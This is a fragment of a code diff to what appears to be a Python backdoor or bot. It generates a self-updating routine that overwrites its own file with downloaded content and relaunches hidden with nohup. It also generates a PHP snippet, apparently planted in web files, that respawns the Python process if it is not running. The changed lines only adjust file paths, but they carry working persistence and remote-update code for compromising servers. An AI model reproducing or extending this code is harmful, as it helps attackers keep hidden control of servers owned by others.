@@ -46,12 +46,12 @@ html = response.read()
 
 os.system("kill %s")
 
-f = open("%s/%s", "w")
+f = open("%s", "w")
 f.write(html)
 f.close()
 
-os.system("nohup python %s/%s %s %s > /dev/null 2>&1 &")
-""" % (os.getpid(), os.path.abspath(os.path.dirname(sys.argv[0])), sys.argv[0], os.path.abspath(os.path.dirname(sys.argv[0])), sys.argv[0], host, port)
+os.system("nohup python %s %s %s > /dev/null 2>&1 &")
+""" % (os.getpid(), os.path.realpath(__file__), os.path.realpath(__file__), host, port)
 
 def selfUpdate():
 	while 1:
@@ -330,12 +330,12 @@ foreach($php_functions as $function)
 
 $checker = evalRel("ps aux | grep '%s %s'", 1);
 
-if (strpos($checker, "%s") === False)
+if (strpos($checker, "python") === False)
 {
-	evalRel("nohup python %s/%s %s %s > /dev/null 2>&1 &", 2);
+	evalRel("nohup python %s %s %s > /dev/null 2>&1 &", 2);
 }
 ?>
-""" % (host, port, sys.argv[0], os.path.abspath(os.path.dirname(sys.argv[0])), sys.argv[0], host, port)
+""" % (host, port, os.path.realpath(__file__), host, port)
 
 def find_files(directory, pattern):
 	for root, dirs, files in os.walk(directory):
